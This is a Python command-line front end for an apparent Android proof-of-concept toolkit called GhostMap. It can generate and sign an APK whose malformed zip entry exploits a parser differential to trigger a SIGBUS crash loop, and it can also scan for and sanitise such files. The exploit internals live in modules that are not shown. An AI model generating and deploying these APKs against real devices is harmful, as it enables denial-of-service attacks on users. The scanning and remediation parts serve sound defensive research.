import sys
import os
import argparse

from .generator import GhostMapGenerator
from .zip_utils import parse_zip_file
from .analyzer import check_libziparchive, check_libandroidfw, ParserStatus
from .signer import ApkSigner
from .remediation import sanitize_apk


def cmd_generate(args):
    print("[*] Generating GhostMap PoC...")
    out = GhostMapGenerator.generate(
        output_path=args.output,
        target_entry=args.target,
        method=args.method,
        phantom_size=args.size,
    )
    fsize = os.path.getsize(out)
    print(f"[+] Written to: {out}")
    print(f"    Target entry: {args.target}")
    print(f"    Compression method: {args.method}")
    print(f"    Declared size: {args.size:,} bytes ({args.size / (1024*1024):.1f} MB)")
    print(f"    Physical size: {fsize:,} bytes")
    print(f"    Phantom overshoot: {max(0, args.size - fsize):,} bytes")


def cmd_scan(args):
    target = args.file
    if not os.path.exists(target):
        print(f"[-] File not found: {target}")
        sys.exit(1)

    fsize = os.path.getsize(target)
    print(f"[*] Scanning '{target}' ({fsize:,} bytes)...\n")

    try:
        entries, cd_offset = parse_zip_file(target)
    except Exception as e:
        print(f"[-] Parse error: {e}")
        sys.exit(1)

    vulns = []
    for entry in entries:
        name = entry.filename.decode("utf-8", errors="replace")
        zs, zm = check_libziparchive(
            entry.compression_method, entry.data_offset,
            entry.uncompressed_size, cd_offset,
        )
        fs, fm = check_libandroidfw(
            entry.compression_method, entry.data_offset,
            entry.uncompressed_size, fsize,
        )
        is_ghost = (zs == ParserStatus.OK and fs == ParserStatus.SIGBUS)

        if is_ghost or entry.compression_method not in (0, 8):
            vulns.append({
                "entry": name, "method": entry.compression_method,
                "comp": entry.compressed_size, "uncomp": entry.uncompressed_size,
                "libzip": zm, "libandroidfw": fm, "ghostmap": is_ghost,
            })

    if vulns:
        print(f"[!] Found {len(vulns)} anomalous entry(s):")
        for v in vulns:
            tag = "GHOSTMAP VULNERABILITY" if v["ghostmap"] else "ANOMALY"
            print(f"\n  [{tag}] {v['entry']}")
            print(f"    Method: {v['method']} | Compressed: {v['comp']:,} | Declared: {v['uncomp']:,}")
            print(f"    libziparchive -> {v['libzip']}")
            print(f"    libandroidfw  -> {v['libandroidfw']}")
        if any(v["ghostmap"] for v in vulns):
            print("\n[!] VERDICT: This APK triggers the GhostMap SIGBUS crash loop.")
            sys.exit(2)
    else:
        print(f"[+] All {len(entries)} entries are clean.")


def cmd_sign(args):
    print(f"[*] Signing '{args.input}'...")
    out = ApkSigner.sign_apk(args.input, args.output, args.key, args.cert)
    print(f"[+] Signed APK: {out} ({os.path.getsize(out):,} bytes)")


def cmd_sanitize(args):
    print(f"[*] Sanitizing '{args.input}'...")
    modified, count = sanitize_apk(args.input, args.output)
    if modified:
        print(f"[+] Fixed {count} malformed entry(s) -> {args.output}")
    else:
        print("[+] File is already clean.")


def main():
    parser = argparse.ArgumentParser(
        description="GhostMap PoC - Android Parser Differential Exploit Toolkit"
    )
    sub = parser.add_subparsers(dest="cmd")

    gen = sub.add_parser("generate", help="Generate a GhostMap PoC APK")
    gen.add_argument("-o", "--output", default="output/ghostmap_poc.apk")
    gen.add_argument("-t", "--target", default="resources.arsc")
    gen.add_argument("-m", "--method", type=int, default=99)
    gen.add_argument("-s", "--size", type=int, default=16 * 1024 * 1024)

    sc = sub.add_parser("scan", help="Scan an APK for GhostMap vulnerabilities")
    sc.add_argument("file")

    si = sub.add_parser("sign", help="Sign and align an APK")
    si.add_argument("input")
    si.add_argument("-o", "--output", required=True)
    si.add_argument("--key", default=None)
    si.add_argument("--cert", default=None)

    sa = sub.add_parser("sanitize", help="Neutralize a GhostMap APK")
    sa.add_argument("input")
    sa.add_argument("-o", "--output", required=True)

    args = parser.parse_args()
    if not args.cmd:
        parser.print_help()
        sys.exit(1)

    {"generate": cmd_generate, "scan": cmd_scan, "sign": cmd_sign, "sanitize": cmd_sanitize}[args.cmd](args)


if __name__ == "__main__":
    main()
